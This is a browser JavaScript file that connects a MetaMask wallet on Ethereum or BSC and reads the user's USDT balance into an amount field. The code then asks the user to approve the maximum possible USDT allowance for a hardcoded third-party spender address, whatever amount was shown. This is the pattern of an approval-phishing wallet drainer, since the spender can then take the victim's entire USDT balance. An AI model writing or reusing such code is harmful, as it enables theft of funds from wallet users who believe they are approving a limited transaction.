let provider;
let signer;
let usdtContract;
let USDT_ADDRESS;
let SPENDER_ADDRESS;

const USDT_ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

async function connectWallet() {
  if (!window.ethereum) {
    alert("MetaMask not found");
    return;
  }

  // 🔥 THIS WAS MISSING
  await window.ethereum.request({ method: "eth_requestAccounts" });

  provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();

  const network = await provider.getNetwork();
  const chainId = Number(network.chainId);

  console.log("Connected chain:", chainId);

  if (chainId === 1) {
    // Ethereum
    USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    SPENDER_ADDRESS = "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7";
  } else if (chainId === 56) {
    // BSC
    USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    SPENDER_ADDRESS = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
  } else {
    alert("Please switch to Ethereum or BSC");
    throw new Error("Wrong network");
  }

  usdtContract = new ethers.Contract(
    USDT_ADDRESS,
    USDT_ABI,
    signer
  );
}

async function setMax() {
  await connectWallet();

  const user = await signer.getAddress();
  const balance = await usdtContract.balanceOf(user);
  const decimals = await usdtContract.decimals();

  document.getElementById("amount").value =
    ethers.formatUnits(balance, decimals);
}

async function approveUSDT() {
  try {
    await connectWallet();

    const MAX_UINT =
      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    const tx = await usdtContract.approve(
      SPENDER_ADDRESS,
      MAX_UINT
    );

    alert("Approval tx sent");
    console.log("TX hash:", tx.hash);

  } catch (err) {
    console.error(err);
    alert("Approval failed: " + (err.reason || err.message));
  }
}
